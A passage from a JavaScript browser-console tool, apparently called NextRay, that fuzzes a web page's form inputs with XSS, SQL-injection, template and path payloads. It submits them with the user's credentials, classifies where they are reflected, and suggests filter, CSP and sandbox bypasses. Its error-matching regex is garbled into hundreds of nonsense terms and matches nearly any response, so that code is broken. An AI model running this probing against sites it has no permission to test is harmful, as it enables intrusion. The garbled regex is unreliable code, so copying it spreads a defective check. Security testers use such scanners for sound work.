    if (/<!--[\s\S]*?NxR[\s\S]*?-->/i.test(snippet)) return "html_comment";
    if (/\/\*[\s\S]*?NxR[\s\S]*?\*\//i.test(snippet)) return "js_comment";
    if (/\/\/[^\n]*?NxR[^\n]*/i.test(snippet)) return "js_line_comment";
    if (/<\?[\s\S]*?NxR[\s\S]*?\?>/i.test(snippet)) return "php_block";
    if (/<\%[\s\S]*?NxR[\s\S]*?\%>/i.test(snippet)) return "asp_block";
    if (/\{[\s\S]*?NxR[\s\S]*?\}/i.test(snippet)) return "template_literal";
    if (/\$[\w]*NxR[\w]*/i.test(snippet)) return "variable";
    if (/function[\s\S]*?NxR[\s\S]*?\(/i.test(snippet)) return "function_name";
    if (/class[\s\S]*?NxR[\s\S]*?\{/i.test(snippet)) return "class_name";
    if (/import[\s\S]*?NxR[\s\S]*?from/i.test(snippet))
      return "import_statement";
    if (/require\([^)]*NxR[^)]*\)/i.test(snippet)) return "require_statement";
    if (/console\.(log|error|warn|info)\([^)]*NxR[^)]*\)/i.test(snippet))
      return "console_log";
    if (/document\.(write|writeln)\([^)]*NxR[^)]*\)/i.test(snippet))
      return "document_write";
    if (/eval\([^)]*NxR[^)]*\)/i.test(snippet)) return "eval_call";
    if (/setTimeout\([^)]*NxR[^)]*\)/i.test(snippet)) return "timeout_call";
    if (/setInterval\([^)]*NxR[^)]*\)/i.test(snippet)) return "interval_call";
    return "unknown";
  }

  async function checkReflection(urlText, payloadMarker) {
    const maxLen = 200000; // cap
    const text = (urlText || "").slice(0, maxLen);
    const idx = text.indexOf(payloadMarker);
    if (idx === -1) return { reflected: false };
    const start = Math.max(0, idx - 120);
    const end = Math.min(text.length, idx + 120);
    const snippet = text.slice(start, end);
    const context = classifyContext(snippet);
    return { reflected: true, snippet, context };
  }

  // DOM reflection sweep — checks current document for sink reflections
  function scanDOMForReflections(marker = "NxR") {
    const findings = [];
    try {
      // 1) Text/HTML content
      const walker = document.createTreeWalker(
        document.body || document,
        NodeFilter.SHOW_TEXT,
        null
      );
      let n;
      while ((n = walker.nextNode())) {
        if (typeof n.nodeValue === "string" && n.nodeValue.includes(marker)) {
          const el = n.parentElement || document.body;
          const pos = n.nodeValue.indexOf(marker);
          const snippet = n.nodeValue.slice(Math.max(0, pos - 60), pos + 60);
          findings.push({
            sink: "text",
            target: elementPath(el),
            context: classifyContext(snippet),
            snippet,
          });
        }
      }
      // 2) Attribute injections (event handlers, href/src, data-*, aria-*)
      const attrsToCheck = [
        /^on/i,
        /^(href|src|action|formaction|xlink:href)$/i,
        /^data-/i,
        /^aria-/i,
        /^style$/i,
      ];
      for (const el of Array.from(
        (document.body || document).querySelectorAll("*")
      )) {
        for (const a of Array.from(el.attributes || [])) {
          if (!attrsToCheck.some((rx) => rx.test(a.name))) continue;
          if ((a.value || "").includes(marker)) {
            const snippet =
              a.name + "=" + JSON.stringify(a.value).slice(0, 140);
            findings.push({
              sink: "attribute",
              target: elementPath(el),
              attr: a.name,
              context: classifyContext(snippet),
              snippet,
            });
          }
        }
      }
      // 3) Script/style blocks (heuristic for dangerous sinks)
      for (const s of Array.from(document.querySelectorAll("script, style"))) {
        const code = s.textContent || "";
        if (code.includes(marker)) {
          const idx = code.indexOf(marker);
          const snippet = code.slice(Math.max(0, idx - 80), idx + 80);
          findings.push({
            sink: s.tagName.toLowerCase(),
            target: elementPath(s),
            context: classifyContext(snippet),
            snippet,
          });
        }
      }
    } catch (_) {}
    return findings;
  }

  async function testSpecialChars(el, form, opts, report) {
    const results = [];
    for (const ch of BASE_CHARS) {
      const probe = probeInput(el, ch);
      const accepted =
        !probe.changed && (!probe.validity || probe.validity.valid);
      results.push({ char: ch, accepted, modifiedTo: probe.modifiedTo });
    }
    return results;
  }

  // ---------------------------
  // Runner: Per Input → Per Payload → Per Variant
  // ---------------------------
  async function testInput(opts, form, el, report) {
    const id = elementPath(el);
    const attr = attrSummary(el);

    const perInput = {
      target: id,
      tag: el.tagName.toLowerCase(),
      name: el.name || el.id || null,
      attributes: attr,
      validation: {
        required: el.required || false,
        type: el.type || null,
        pattern: el.getAttribute("pattern") || null,
        min: el.getAttribute("min") || null,
        max: el.getAttribute("max") || null,
        minlength: el.getAttribute("minlength") || null,
        maxlength: el.getAttribute("maxlength") || null,
        placeholder:
          el.getAttribute && (el.getAttribute("placeholder") || null),
        autocomplete:
          el.getAttribute && (el.getAttribute("autocomplete") || null),
        inputmode: el.getAttribute && (el.getAttribute("inputmode") || null),
        spellcheck: el.getAttribute && (el.getAttribute("spellcheck") || null),
        ariaInvalid:
          el.getAttribute && (el.getAttribute("aria-invalid") || null),
      },
      charMatrix: [],
      probes: [],
      reflections: [],
      errors: [],
      suggestions: [],
    };

    // Character acceptance matrix (client-side)
    perInput.charMatrix = allowedCharsMatrix(el);

    // Special character tests
    if (opts.testSpecialChars) {
      perInput.specialChars = await testSpecialChars(el, form, opts, report);
    }

    // Build a compact payload set
    const payloadSet = [
      ...BASE_PAYLOADS.generic,
      ...BASE_PAYLOADS.xss_soft,
      ...BASE_PAYLOADS.sqli_soft,
      ...BASE_PAYLOADS.ssti_soft,
      ...BASE_PAYLOADS.path_soft,
    ].slice(0, opts.maxPerInput);

    const heavy = opts.mode === "heavy";

    for (const p of payloadSet) {
      const variants = buildVariants(p, heavy);
      for (const v of variants) {
        const marker = p.includes("NxR") ? "NxR" : v.value.slice(0, 64);
        const probe = probeInput(el, v.value);
        perInput.probes.push({
          base: p,
          variant: v.label,
          changed: probe.changed,
          modifiedTo: probe.modifiedTo,
          validity: probe.validity,
        });

        if (opts.mode === "passive") continue;

        // Active/Heavy: attempt non-destructive submission via fetch
        try {
          let res = null,
            text = null,
            status = null,
            url = null;
          if (form) {
            const method = opts.network.respectMethod
              ? form.getAttribute("method") || "GET"
              : "GET";
            const action = form.getAttribute("action") || location.href;
            const data = extractFormData(
              form,
              el.name ? { [el.name]: v.value } : null
            );
            res = await makeFormRequest(form, data, method, action);
          } else if (el.form) {
            const f = el.form;
            const method = opts.network.respectMethod
              ? f.getAttribute("method") || "GET"
              : "GET";
            const action = f.getAttribute("action") || location.href;
            const data = extractFormData(
              f,
              el.name ? { [el.name]: v.value } : null
            );
            res = await makeFormRequest(f, data, method, action);
          } else {
            // No form: try query param echo via GET on current URL
            const current = new URL(location.href);
            const key = el.name || "nextray";
            current.searchParams.set(key, v.value);
            res = await fetch(current.toString(), { credentials: "include" });
          }

          status = res.status;
          url = res.url;
          text = await res.text();

          const refl = await checkReflection(text, marker);
          if (refl.reflected) {
            perInput.reflections.push({
              base: p,
              variant: v.label,
              status,
              url,
              context: refl.context,
              snippet: refl.snippet,
            });
          }

          // Simple error fingerprinting
          if (
            /syntax error|mysql|sqlstate|sqlite|odbc|psql|ORA-|Uncaught|ReferenceError|TypeError|stack trace|exception|error|warning|fatal|critical|alert|emergency|notice|debug|info|warn|PDOException|mysqli|postgresql|oracle|sql server|database error|query error|SQL syntax|invalid query|unknown column|undefined index|undefined variable|segmentation fault|core dumped|memory leak|buffer overflow|access violation|permission denied|file not found|directory not found|path not found|module not found|class not found|method not found|function not found|invalid argument|invalid parameter|timeout|connection refused|connection reset|network error|dns error|ssl error|certificate error|authentication error|authorization error|access denied|forbidden|not authorized|unauthorized|invalid credentials|login failed|authentication failed|session expired|token expired|invalid token|malformed request|bad request|invalid input|validation error|constraint violation|foreign key violation|unique constraint|duplicate entry|primary key violation|data truncation|overflow|underflow|division by zero|infinity|nan|not a number|invalid operation|illegal operation|unsupported operation|deprecated|obsolete|obsolete function|deprecated function|warning:|notice:|fatal error:|critical error:|system error|internal error|server error|application error|runtime error|compile error|parse error|syntax error|semantic error|link error|load error|import error|module error|package error|library error|framework error|api error|service error|web service error|soap error|rest error|http error|restful error|json error|xml error|parsing error|deserialization error|serialization error|encoding error|decoding error|format error|validation failed|invalid format|malformed data|corrupted data|data integrity|checksum error|hash mismatch|signature mismatch|encryption error|decryption error|cipher error|key error|certificate error|ssl handshake|tls error|connection error|disconnected|connection lost|timeout expired|deadline exceeded|resource exhausted|quota exceeded|rate limit|throttled|blocked|banned|blacklisted|whitelist|firewall|intrusion detection|security violation|csrf token|xsrf token|xss attack|sql injection|command injection|path traversal|directory traversal|file inclusion|remote code execution|privilege escalation|buffer overflow|integer overflow|memory corruption|use after free|double free|race condition|deadlock|starvation|livelock|priority inversion|thread safety|concurrency issue|synchronization error|locking error|transaction error|commit failed|rollback|isolation violation|consistency error|atomicity violation|durability error|acid violation|acid properties|database transaction|transaction isolation|locking protocol|deadlock detection|timeout rollback|constraint check|trigger error|stored procedure|function error|package error|schema error|metadata error|catalog error|dictionary error|repository error|persistence error|orm error|object relational mapping|hibernate error|entity error|jpa error|jdbc error|connection pool|datasource error|driver error|provider error|adapter error|gateway error|proxy error|middleware error|filter error|interceptor error|aspect error|aop error|dependency injection|inversion of control|di error|ioc error|container error|context error|scope error|lifecycle error|initialization error|configuration error|settings error|property error|parameter error|argument error|option error|flag error|switch error|environment error|system property|jvm error|garbage collection|out of memory|memory leak|heap error|stack error|thread error|process error|fork error|spawn error|exec error|system call|kernel error|driver error|device error|hardware error|firmware error|bios error|uefi error|boot error|startup error|initialization error|loading error|linking error|binding error|resolution error|naming error|directory error|namespace error|scope error|context error|environment error|locale error|timezone error|encoding error|charset error|collation error|sorting error|index error|search error|query error|filter error|projection error|aggregation error|grouping error|ordering error|limit error|offset error|pagination error|cursor error|iterator error|enumeration error|stream error|pipe error|channel error|socket error|port error|endpoint error|uri error|url error|urn error|domain error|hostname error|ip error|mac error|protocol error|transport error|network layer|data link|physical layer|application layer|session layer|presentation layer|transport layer|network layer|data link layer|physical layer|osi model|tcp error|udp error|http error|https error|ftp error|smtp error|pop error|imap error|dns error|dhcp error|ntp error|snmp error|ldap error|kerberos error|oauth error|saml error|ws-security|xml security|json security|web security|mobile security|cloud security|endpoint security|network security|application security|data security|information security|cybersecurity|information assurance|risk management|threat modeling|vulnerability assessment|penetration testing|security testing|compliance testing|audit trail|logging error|monitoring error|alerting error|notification error|reporting error|dashboard error|visualization error|analytics error|business intelligence|data mining|machine learning|artificial intelligence|natural language processing|computer vision|speech recognition|biometric error|authentication factor|multi-factor authentication|single sign-on|federated identity|identity management|access management|privilege management|role-based access|attribute-based access|policy-based access|entitlement management|governance error|compliance error|regulatory error|legal error|privacy error|data protection|personal data|sensitive data|confidential data|classified data|restricted data|proprietary data|intellectual property|trade secret|copyright error|patent error|trademark error|licensing error|contract error|agreement error|service level|quality of service|performance error|scalability error|availability error|reliability error|durability error|fault tolerance|disaster recovery|backup error|restore error|replication error|synchronization error|consistency error|coherency error|cache error|buffer error|queue error|stack error|heap error|memory error|storage error|disk error|file system|volume error|partition error|mount error|unmount error|format error|corruption error|recovery error|repair error|diagnostic error|troubleshooting error|debugging error|profiling error|benchmarking error|testing error|quality assurance|continuous integration|continuous deployment|devops error|infrastructure error|platform error|environment error|configuration management|deployment error|release error|version error|build error|compile error|link error|package error|distribution error|installation error|setup error|configuration error|customization error|personalization error|localization error|internationalization error|globalization error|multilingual error|multi-lingual error|cross-cultural error|cultural error|regional error|geographic error|geospatial error|location error|position error|navigation error|mapping error|cartography error|gis error|remote sensing|satellite error|aerial error|drone error|robotics error|automation error|process control|industrial control|scada error|dcs error|plc error|sensor error|actuator error|transducer error|instrumentation error|measurement error|calibration error|validation error|verification error|certification error|qualification error|accreditation error|standardization error|normalization error|conformity error|compliance error|regulatory error|legal error|statutory error|mandatory error|optional error|recommended error|suggested error|best practice|guideline error|recommendation error|advisory error|informational error|notification error|warning error|caution error|attention error|important error|critical error|severe error|fatal error|catastrophic error|system crash|kernel panic|blue screen|stop error|halt error|shutdown error|restart error|reboot error|power error|energy error|battery error|charging error|discharging error|thermal error|temperature error|cooling error|heating error|climate error|environmental error|weather error|natural disaster|earthquake error|flood error|fire error|explosion error|accident error|incident error|event error|occurrence error|situation error|condition error|state error|status error|mode error|phase error|stage error|step error|process error|procedure error|method error|technique error|approach error|strategy error|tactic error|plan error|schedule error|timeline error|deadline error|milestone error|target error|goal error|objective error|mission error|vision error|purpose error|intent error|motivation error|drive error|incentive error|reward error|punishment error|consequence error|impact error|effect error|result error|outcome error|conclusion error|resolution error|solution error|answer error|response error|reaction error|behavior error|conduct error|performance error|execution error|implementation error|deployment error|rollout error|launch error|go-live error|production error|live error|operational error|functional error|non-functional error|quality error|excellence error|perfection error|optimization error|efficiency error|effectiveness error|productivity error|output error|throughput error|capacity error|bandwidth error|latency error|delay error|wait error|pause error|suspend error|resume error|continue error|proceed error|advance error|progress error|regress error|retreat error|fallback error|rollback error|revert error|undo error|reverse error|backtrack error|retrograde error|regressive error|progressive error|evolutionary error|revolutionary error|innovative error|creative error|inventive error|original error|novel error|unique error|rare error|uncommon error|infrequent error|occasional error|periodic error|regular error|frequent error|constant error|continuous error|persistent error|ongoing error|lasting error|enduring error|permanent error|temporary error|transient error|ephemeral error|short-term error|long-term error|medium-term error|intermediate error|moderate error|average error|typical error|normal error|standard error|usual error|common error|popular error|trendy error|fashionable error|stylish error|elegant error|sophisticated error|complex error|complicated error|intricate error|elaborate error|detailed error|thorough error|comprehensive error|complete error|full error|entire error|whole error|total error|overall error|general error|broad error|wide error|extensive error|vast error|enormous error|huge error|massive error|gigantic error|colossal error|tremendous error|immense error|vast error|spacious error|roomy error|capacious error|ample error|abundant error|plentiful error|copious error|profuse error|lavish error|extravagant error|luxurious error|opulent error|magnificent error|splendid error|glorious error|sublime error|exalted error|elevated error|high error|tall error|lofty error|towering error|soaring error|sky-high error|astronomical error|cosmic error|universal error|global error|worldwide error|international error|multinational error|transnational error|supranational error|intergovernmental error|interstate error|interprovincial error|intermunicipal error|intercity error|interurban error|rural error|urban error|metropolitan error|municipal error|provincial error|state error|federal error|national error|supranational error|continental error|intercontinental error|transcontinental error|oceanic error|maritime error|nautical error|naval error|seafaring error|oceanic error|marine error|aquatic error|water error|liquid error|fluid error|gaseous error|air error|atmospheric error|aerial error|celestial error|heavenly error|divine error|godly error|sacred error|holy error|blessed error|cursed error|damned error|evil error|wicked error|sinister error|malevolent error|malicious error|vindictive error|spiteful error|vengeful error|revengeful error|retaliatory error|payback error|reprisal error|retaliation error|counterattack error|countermeasure error|defense error|protection error|safeguard error|security error|safety error|health error|medical error|clinical error|diagnostic error|therapeutic error|pharmaceutical error|medicinal error|drug error|medicine error|treatment error|therapy error|remedy error|cure error|healing error|recovery error|convalescence error|rehabilitation error|restoration error|reconstruction error|rebuilding error|renovation error|refurbishment error|modernization error|upgrading error|enhancement error|improvement error|betterment error|advancement error|progress error|development error|growth error|expansion error|extension error|enlargement error|magnification error|amplification error|intensification error|strengthening error|fortification error|reinforcement error|consolidation error|solidification error|stabilization error|balancing error|equilibration error|equilibrium error|homeostasis error|regulation error|control error|management error|administration error|governance error|leadership error|direction error|guidance error|steering error|navigation error|piloting error|driving error|operating error|handling error|manipulation error|control error|command error|order error|instruction error|directive error|mandate error|requirement error|necessity error|obligation error|duty error|responsibility error|accountability error|liability error|answerability error|explainability error|justification error|rationale error|reason error|cause error|origin error|source error|root error|foundation error|base error|ground error|bottom error|underlying error|fundamental error|basic error|elementary error|primary error|principal error|main error|major error|significant error|important error|crucial error|vital error|essential error|necessary error|required error|mandatory error|compulsory error|obligatory error|binding error|contractual error|legal error|lawful error|legitimate error|valid error|sound error|reasonable error|logical error|rational error|sensible error|prudent error|wise error|intelligent error|smart error|clever error|ingenious error|brilliant error|brilliant error|excellent error|outstanding error|superior error|preeminent error|paramount error|supreme error|highest error|ultimate error|final error|last error|concluding error|terminal error|ending error|finish error|completion error|accomplishment error|achievement error|success error|victory error|triumph error|win error|gain error|profit error|benefit error|advantage error|edge error|lead error|head start|boost error|lift error|rise error|increase error|growth error|expansion error|extension error|prolongation error|continuation error|continuance error|duration error|period error|time error|moment error|instant error|second error|minute error|hour error|day error|week error|month error|year error|decade error|century error|millennium error|era error|epoch error|age error|period error|time error|date error|calendar error|schedule error|timing error|synchronization error|coordination error|harmonization error|alignment error|adjustment error|tuning error|calibration error|setting error|configuration error|arrangement error|organization error|ordering error|sorting error|classification error|categorization error|grouping error|clustering error|partitioning error|segmentation error|division error|separation error|isolation error|compartmentalization error|encapsulation error|containment error|restriction error|limitation error|constraint error|boundary error|limit error|threshold error|ceiling error|floor error|minimum error|maximum error|optimum error|ideal error|perfect error|flawless error|impeccable error|faultless error|defect-free error|blemish-free error|stain-free error|spotless error|clean error|pure error|clean error|clear error|transparent error|obvious error|evident error|apparent error|visible error|observable error|perceptible error|detectable error|identifiable error|recognizable error|distinguishable error|differentiable error|discernible error|perceivable error|sensible error|feelable error|tangible error|palpable error|touchable error|graspable error|seizable error|catchable error|gettable error|obtainable error|acquirable error|achievable error|attainable error|reachable error|accessible error|available error|present error|current error|existing error|actual error|real error|true error|genuine error|authentic error|legitimate error|bona fide error|valid error|sound error|solid error|substantial error|material error|tangible error|concrete error|definite error|specific error|particular error|precise error|exact error|accurate error|correct error|right error|proper error|appropriate error|suitable error|fit error|adequate error|sufficient error|enough error|ample error|abundant error|copious error|plentiful error|profuse error|lavish error|extravagant error|luxurious error|opulent error|magnificent error|splendid error|glorious error|sublime error|exalted error|elevated error|high error|tall error|lofty error|towering error|soaring error|sky-high error|astronomical error|cosmic error|universal error|global error|worldwide error|international error|multinational error|transnational error|supranational error|intergovernmental error/i.test(
              text
            )
          ) {
            perInput.errors.push({
              base: p,
              variant: v.label,
              status,
              url,
              hint: "Error-like pattern in response",
            });
          }
        } catch (e) {
          perInput.errors.push({
            base: p,
            variant: v.label,
            hint: String((e && e.message) || e),
          });
        }
      }
    }

    // Suggestions (walkthrough) based on probes
    const rejects = perInput.charMatrix
      .filter((c) => !c.accepted)
      .map((c) => c.ch);
    const allows = perInput.charMatrix
      .filter((c) => c.accepted)
      .map((c) => c.ch);
    const hasReflection = perInput.reflections.length > 0;

    // Heuristic suggestions
    if (rejects.length && allows.length) {
      perInput.suggestions.push(
        "Frontend rejects: " +
          escapeControl(rejects.join("")) +
          "; allowed: " +
          escapeControl(allows.join("")) +
          ". Try encoding/decoding or JSON tampering."
      );
    }
    if (hasReflection) {
      const ctxs = [...new Set(perInput.reflections.map((r) => r.context))];
      perInput.suggestions.push(
        "Reflection contexts: " +
          ctxs.join(", ") +
          " → craft context‑specific payloads."
      );
    }
    if (perInput.validation.pattern) {
      perInput.suggestions.push(
        "Pattern detected: " +
          perInput.validation.pattern +
          " → attempt regex bypass (URL‑encoding, case, overlongs)."
      );
    }
    if (perInput.validation.maxlength) {
      perInput.suggestions.push(
        "maxlength=" +
          perInput.validation.maxlength +
          " → try truncation or parser differentials."
      );
    }

    // Additional robotic suggestions (6+)
    if (
      allows.includes("\u200b") ||
      allows.includes("\u200d") ||
      allows.includes("\ufeff")
    ) {
      perInput.suggestions.push(
        "Zero-width/format chars allowed → attempt stealth insertion (ZWSP/BOM) to bypass pattern checks."
      );
    }
    if (
      perInput.validation.type &&
      /email|url|number|tel/.test(perInput.validation.type)
    ) {
      perInput.suggestions.push(
        "Type=" +
          perInput.validation.type +
          " → abuse parser differences (unicode dots, fullwidth, mixed scripts)."
      );
    }
    if (
      perInput.errors.some((e) =>
        /sql|mysql|sqlite|odbc|ORA-|psql/i.test(e.hint || "")
      )
    ) {
      perInput.suggestions.push(
        "Backend error hints SQL → pivot to boolean/time-based checks with benign toggles."
      );
    }
    if (!hasReflection && perInput.errors.length === 0) {
      perInput.suggestions.push(
        "No reflection/errors → check JSON/DOM sinks, 30x redirects, or delayed hydration states."
      );
    }
    if (
      report.pageState &&
      Array.isArray(report.pageState.csp) &&
      report.pageState.csp.length
    ) {
      perInput.suggestions.push(
        "CSP present → prefer attribute/JSON/URL-based injections; try event handlers and sandbox escapes."
      );
    }
    if (
      allows.includes("％") ||
      allows.includes("／") ||
      allows.includes("＇")
    ) {
      perInput.suggestions.push(
        "Fullwidth confusables accepted → try homoglyph payloads and unicode normalization mismatches."
      );
    }

    report.inputs.push(perInput);
  }

  // ---------------------------
  // Orchestrator
  // ---------------------------
  async function run(userOpts = {}) {
    const opts = Object.assign({}, DEFAULTS, userOpts || {});

    const t0 = performance.now();

    const currentDomain = window.location.hostname;

    // If targetDomain is set, skip scanning on mismatched hostname
    if (opts.targetDomain && opts.targetDomain !== currentDomain) {
      console.warn(
        `[NextRay] Skipping scan: current domain (${currentDomain}) != targetDomain (${opts.targetDomain})`
      );
      return null; // Or return empty report object, up to you
    }

    // Narrow down DOM scan if scope given, else entire document
    const root =
      opts.scope && opts.scope !== "document"
        ? document.querySelector(opts.scope)
        : document;

    if (!root) {
      console.warn(
        `[NextRay] Scope selector "${opts.scope}" did not match any element.`
      );
      return null;
    }

    // Proceed to gather targets only within the specified root element
    const targets = getAllTargets(Object.assign({}, opts, { scopeRoot: root }));

    // ...(rest of run function)...

    const report = {
      tool: "NextRay",
      version: __version,
      startedAt: nowISO(),
      mode: opts.mode,
      page: { url: location.href, title: document.title },
      pageState: collectPageState(),
      counts: {
        forms: targets.forms.length,
        inputs: targets.inputs.length,
        buttons: targets.buttons.length,
        editables: targets.editables.length,
        interactives: (targets.interactives || []).length,
      },
      inputs: [],
      interactives: [],
    };

    console.groupCollapsed(
      "%cNextRay",
      "background:#111;color:#0f0;padding:2px 6px;border-radius:6px",
      "v" + __version,
      opts
    );
    console.info("[NextRay] Targets:", report.counts);

    const work = [];
    for (const el of targets.inputs) {
      const f = el.form || null;
      work.push(testInput(opts, f, el, report));
    }

    // Optionally probe contenteditables as text nodes
    if (opts.includeContentEditable) {
      for (const el of targets.editables) {
        // Wrap contenteditable-like probe into a faux input object
        const faux = document.createElement("input");
        faux.name = el.getAttribute("name") || el.id || "editable";
        el.appendChild(document.createComment("NextRay probe"));
        work.push(testInput(opts, null, faux, report));
      }
    }

    // Inventory interactives for state mapping
    if (targets.interactives && targets.interactives.length) {
      report.interactives = targets.interactives.map(interactiveSummary);
    }

    await Promise.all(work);

    const t1 = performance.now();
    report.durationMs = Math.round(t1 - t0);
    report.finishedAt = nowISO();

    console.info("[NextRay] Finished in", report.durationMs + "ms");
    console.groupEnd();

    window.NextRay.__lastReport = report;
    return report;
  }

  // ---------------------------
  // Reporting Helpers
  // ---------------------------
  function summarize(report) {
    const rows = [];
    for (const r of report.inputs) {
      const contexts = [...new Set(r.reflections.map((x) => x.context))].join(
        ", "
      );
      rows.push({
        target: r.target,
        name: r.name,
        type: r.validation.type,
        reflections: r.reflections.length,
        errors: r.errors.length,
        contexts,
        pattern: r.validation.pattern || "",
        suggestions: r.suggestions.slice(0, 2).join(" | "),
      });
    }
    return rows.sort(
      (a, b) => b.reflections + b.errors - (a.reflections + a.errors)
    );
  }

  function reportPretty() {
    const rpt = window.NextRay.__lastReport;
    if (!rpt) {
      console.warn("[NextRay] No report yet. Run NextRay.run() first.");
      return;
    }
    const rows = summarize(rpt);
    console.table(rows);

    // Extra diagnostics
    console.groupCollapsed("[NextRay] Page State");
    console.log(rpt.pageState);
    console.groupEnd();

    if (rpt.interactives && rpt.interactives.length) {
      console.groupCollapsed(
        "[NextRay] Interactives (" + rpt.interactives.length + ")"
      );
      console.table(
        rpt.interactives.map((x) => ({
          target: x.target,
          tag: x.tag,
          role: x.role,
          href: x.href,
          text: x.text,
          handlers: (x.inlineHandlers || []).join(","),
          datasetKeys: ((x.params && x.params.datasetKeys) || []).length,
        }))
      );
      console.groupEnd();
    }

    console.log("\nDetails: window.NextRay.__lastReport");
  }

  function exportJSON() {
    const rpt = window.NextRay.__lastReport;
    if (!rpt) {
      console.warn("[NextRay] No report to export.");
      return;
    }
    const blob = new Blob([JSON.stringify(rpt, null, 2)], {
      type: "application/json",
    });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "NextRay_Report_" + Date.now() + ".json";
    a.click();
    setTimeout(() => URL.revokeObjectURL(url), 30000);
  }

  // ---------------------------
  // Public API
  // ---------------------------
  window.NextRay = {
    __version,
    run,

    // *** Modified run API to accept targetDomain ***
    run(options = {}) {
      // Provide a default or determine targetDomain automatically if not provided
      const targetDomain = options.targetDomain || location.hostname;
      return run({ ...options, targetDomain }); // Pass targetDomain to internal run function
    },
    exportJSON,
    report: reportPretty,
    help() {
      console.log(
        "NextRay v" +
          __version +
          '\nCommands:\n  NextRay.run({ mode:"passive|active|heavy", scope:"document|<selector>" })\n  NextRay.report()\n  NextRay.exportJSON()'
      );
    },
  };

  console.log(
    "%cNextRay loaded",
    "background:#111;color:#0f0;padding:2px 6px;border-radius:6px",
    "v" + __version,
    "→ NextRay.help()"
  );
})();
